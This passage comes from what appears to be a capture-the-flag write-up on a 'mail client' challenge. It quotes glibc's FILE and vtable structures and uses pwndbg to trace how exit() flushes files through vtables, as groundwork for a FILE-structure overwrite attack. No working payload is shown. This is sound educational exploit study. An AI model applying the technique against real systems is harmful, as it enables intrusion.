style="--0:#AE4B07;--1:#FFAB70">_shortbuf</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">_IO_lock_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_lock;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#ifdef</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_USE_OLD_IO_FILE</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">};</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_FILE_complete</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_FILE _file;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#endif</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">__off64_t</span><span style="--0:#24292E;--1:#E1E4E8"> _offset;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* Wide character stream stuff.  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_codecvt </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_codecvt;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_wide_data </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_wide_data;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_FILE </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_freeres_list;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">49</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_freeres_buf;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">50</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8"> __pad5;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">51</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> _mode;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">52</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* Make sure we don&#39;t get into trouble again.  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">53</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">_unused2</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">15</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">sizeof</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8">)];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">54</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">};</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="/* The tag name of this struct is _IO_FILE to preserve historic   C++ mangled names for functions taking FILE* arguments.   That name should not be used in new code.  */struct _IO_FILE{  int _flags;    /* High-order word is _IO_MAGIC; rest is flags. */  /* The following pointers correspond to the C++ streambuf protocol. */  char *_IO_read_ptr;  /* Current read pointer */  char *_IO_read_end;  /* End of get area. */  char *_IO_read_base;  /* Start of putback+get area. */  char *_IO_write_base;  /* Start of put area. */  char *_IO_write_ptr;  /* Current put pointer. */  char *_IO_write_end;  /* End of put area. */  char *_IO_buf_base;  /* Start of reserve area. */  char *_IO_buf_end;  /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;  int _flags2;  __off_t _old_offset; /* This used to be _offset but it's too small.  */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};struct _IO_FILE_complete{  struct _IO_FILE _file;#endif  __off64_t _offset;  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;  size_t __pad5;  int _mode;  /* Make sure we don't get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];};"><div></div></button></div></figure></div>
<blockquote>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/bits/types/struct_FILE.h#L49" rel="nofollow noreferrer noopener" target="_blank">https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/bits/types/struct_FILE.h#L49</a></p>
</blockquote>
<p>The <code>_IO_FILE</code> is extended into <code>_IO_FILE_plus</code> as follow:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:64ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">/* We always allocate an extra word following an _IO_FILE.</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">   </span></span><span style="--0:#616972;--1:#99A0A6">This contains a pointer to the function jump table used.</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">   </span></span><span style="--0:#616972;--1:#99A0A6">This is for compatibility with C++ streambuf; the word can</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">   </span></span><span style="--0:#616972;--1:#99A0A6">be used to smash to a pointer to a virtual function table. */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_FILE_plus</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">FILE file;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">vtable;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">};</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="/* We always allocate an extra word following an _IO_FILE.   This contains a pointer to the function jump table used.   This is for compatibility with C++ streambuf; the word can   be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus{  FILE file;  const struct _IO_jump_t *vtable;};"><div></div></button></div></figure></div>
<h3 id="why-overwrite-a-file">Why Overwrite a FILE?</h3>
<p>In order to answer that question let’s follow what the program does after <code>exit()</code> is called.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:63ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">gdb</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">-q</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./exitnction</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">b</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">exit</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Breakpoint</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">0x7ffff7c47ba0:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">file</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./stdlib/exit.c,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">line</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">137.</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">r</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Welcome</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">to</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">the</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;Exitnction&#39;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">client!</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Exitnction</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Client</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Commands:</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">read</span><span style="--0:#24292E;--1:#E1E4E8">          </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Read</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">emails</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">write</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Write</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">an</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">e-mail</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">server</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Print</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">server</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">information</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">help</span><span style="--0:#24292E;--1:#E1E4E8">          </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Show</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">this</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">help</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">message</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">exit</span><span style="--0:#24292E;--1:#E1E4E8">          </span><span style="--0:#032F62;--1:#9ECBFF">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Exit</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> exit</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Breakpoint</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">1,</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">__GI_exit</span><span style="--0:#24292E;--1:#E1E4E8"> (status=0) at ./stdlib/exit.c:137</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ gdb -q ./exitnction...SNIP...pwndbg> b exitBreakpoint 1 at 0x7ffff7c47ba0: file ./stdlib/exit.c, line 137.pwndbg> r...SNIP...Welcome to the 'Exitnction' mail client!Exitnction Mail Client Commands:  read          - Read emails  write         - Write an e-mail  server        - Print mail server information  help          - Show this help message  exit          - Exit> exitBreakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:137"><div></div></button></div></figure></div>
<p><img src="https://github.com/user-attachments/assets/67a4318e-3fe1-422d-81cb-8ea6738da6ba" alt/></p>
<p><code>exit()</code> function calls <code>__run_exit_handlers()</code> let’s step into that!</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:12ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; ni 6</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; si</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> ni 6...SNIP...pwndbg> si...SNIP..."><div></div></button></div></figure></div>
<p>Stepping through <code>__run_exit_handlers()</code>, I found that it calls <code>_IO_cleanup()</code>:</p>
<p><img src="https://github.com/user-attachments/assets/a170560c-e8a8-483c-92be-72f56ea007a9" alt/></p>
<p>Let’s step into <code>_IO_cleanup()</code> and see what other functions it’s calling:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:10ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; si</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> si...SNIP..."><div></div></button></div></figure></div>
<p>If we step through <code>_IO_cleanup()</code> we find that it’s calling <code>_IO_flush_all()</code>:</p>
<p><img src="https://github.com/user-attachments/assets/2999609e-b2bc-4b01-abe1-1c815f4b559f" alt/></p>
<p><code>_IO_flush_all()</code> walks the <code>file-&gt;_chain-&gt;_chain-&gt; ... -&gt; NULL</code> linked list and calls the vtable for each file structs if it’s passes the <code>IO_validate_vtable</code> function which checks if it’s within the <code>__io_vtables</code> region.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:69ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">int</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">_IO_flush_all</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> result </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">FILE </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">fp;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#ifdef</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_MTSAFE_IO</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">_IO_cleanup_region_start_noarg</span><span style="--0:#24292E;--1:#E1E4E8"> (flush_cleanup);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">_IO_lock_lock</span><span style="--0:#24292E;--1:#E1E4E8"> (list_all_lock);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#endif</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> (fp </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> (FILE </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">) _IO_list_all; fp </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">; fp </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> fp-&gt;_chain)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">run_fp </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> fp;</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">_IO_flockfile</span><span style="--0:#24292E;--1:#E1E4E8"> (fp);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (((fp-&gt;_mode </span><span style="--0:#BF3441;--1:#F97583">&lt;=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">&amp;&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> fp-&gt;_IO_write_ptr </span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> fp-&gt;_IO_write_base)</span></div></div><div class="ec-line" style="--ecIndent:5ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">     </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">_IO_vtable_offset</span><span style="--0:#24292E;--1:#E1E4E8"> (fp) </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span></div></div><div class="ec-line" style="--ecIndent:9ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">         </span><span style="--0:#BF3441;--1:#F97583">&amp;&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> fp-&gt;_mode </span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">&amp;&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> (fp-&gt;_wide_data-&gt;_IO_write_ptr</span></div></div><div class="ec-line" style="--ecIndent:12ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">            </span><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> fp-&gt;_wide_data-&gt;_IO_write_base))</span></div></div><div class="ec-line" style="--ecIndent:5ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">     </span></span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">&amp;&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_OVERFLOW</span><span style="--0:#24292E;--1:#E1E4E8"> (fp, EOF) </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> EOF)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">result </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> EOF;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code">
